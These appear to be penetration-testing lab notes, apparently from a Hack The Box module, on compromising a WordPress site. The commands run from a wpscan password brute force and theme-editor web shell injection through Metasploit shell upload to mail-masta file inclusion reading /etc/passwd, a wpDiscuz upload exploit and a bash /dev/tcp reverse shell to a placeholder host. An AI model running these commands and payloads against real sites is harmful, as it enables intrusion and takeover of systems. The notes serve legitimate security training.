## Login Bruteforce

WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john).

The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it’s faster.

`tylapcheong@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

The `--password-attack` flag is used to supply the type of attack. The `-U` argument takes in a list of users or a file containing user names. This applies to the `-P` passwords option as well. The `-t` flag is the number of threads which we can adjust up or down depending. WPScan was able to find valid credentials for one user, `john:firebird1`.

## Code Execution

With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the `john` user, which will redirect us to the admin panel. Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly.

Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

`system($_GET[0]);`

The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.

Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.

```
tylapcheong@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```
## Leveraging Known Vulnerabilities

Over the years, WordPress core has suffered from its fair share of vulnerabilities, but the vast majority of them can be found in plugins.

Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

#### Vulnerable Plugins - mail-masta

Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`.

`tylapcheong@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

#### Vulnerable Plugins - wpDiscuz

[wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over [1.6 million downloads](https://wordpress.org/plugins/wpdiscuz/advanced/) and over 90,000 active installations, making it an extremely popular plugin that we have a very good chance of encountering during an assessment. Based on the version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution.

The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post.

`tylapcheong@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`

The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.

Reverse shell
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
```
Or
```
system($_GET[0]);
```

`tylapcheong@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`